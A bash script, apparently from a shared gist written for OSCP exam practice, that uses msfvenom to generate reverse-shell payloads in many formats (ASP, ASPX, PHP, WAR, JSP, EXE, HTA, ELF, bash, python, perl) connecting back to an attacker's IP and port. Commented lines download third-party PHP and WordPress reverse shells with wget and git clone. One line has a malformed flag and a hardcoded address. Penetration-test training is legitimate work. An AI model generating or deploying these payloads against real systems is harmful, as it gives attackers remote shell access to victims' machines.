

----
Share via #!/usr/bin/env bash
# Script to quickly and easily create non-meterpreter payloads for the OSCP
# @m8sec

# Note: It is recommeneded to create a new directory before running this
#       script. All payloads will be placed in the current directory

IP="127.0.0.1" # <YOUR IP HERE>
PORT=443       # You may have to change this if there are outbound restrictions on the target ;)

# Web
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f asp -o revShell_$PORT.asp
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f aspx -o revShell_$PORT.aspx
msfvenom -p php/reverse_php LHOST=$IP LPORT=$PORT -f raw -o revShell_$PORT.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f war -o revShell_$PORT.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f raw -o revShell_$PORT.jsp

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f exe -o revShell_$PORT.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.66 LPORT=443 f hta-psh -o revShell_$PORT.hta

# Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f elf -o revShell_$PORT.elf
msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=$PORT -f raw -o revShell_$PORT.sh
msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=$PORT -f raw -o revShell_$PORT.py
msfvenom -p cmd/unix/reverse_perl LHOST=$IP LPORT=$PORT -f raw -o revShell_$PORT.pl

# Additional Payloads (Optional)
# ------------------------------------------

# WordPress Plugin Reverse Shell
# git clone https://github.com/leonjza/wordpress-shell

# PHP Reverse Shell (Linux Host)
# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O php_revShell.php

# PHP Reverse Shell (Windows Host)
# Windows host but still having issues? Try changing the $tmpdir variable 
# wget https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php -O win_php_revShell.php